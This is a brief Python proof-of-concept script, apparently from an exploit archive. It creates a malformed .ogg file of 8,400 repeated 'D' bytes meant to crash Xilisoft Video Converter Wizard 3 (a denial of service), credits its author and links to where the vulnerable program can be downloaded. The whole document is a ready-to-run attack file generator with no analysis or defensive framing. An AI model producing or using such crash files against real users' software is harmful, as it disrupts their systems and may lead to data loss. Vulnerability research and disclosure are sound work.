################PoC Start##############################################
print "\nXilisoft Video Converter Wizard 3 ogg file processing DoS"

#Download from
# http://www.downloadatoz.com/xilisoft-video-converter/order.php?download=xilisoft-video-converter&url=downloadatoz.com/xilisoft-video-converter/wizard.html/__xilisoft-video-converter__d1
#http://www.downloadatoz.com/xilisoft-video-converter/wizard.html

buff = "D" * 8400

try:
    oggfile = open("XilVC_ogg_crash.ogg","w")
    oggfile.write(buff)
    oggfile.close()
    print "[+]Successfully created ogg file\n"
    print "[+]Coded by Praveen Darshanam\n"
except:
    print "[+]Cannot create File\n"

################PoC End################################################ 
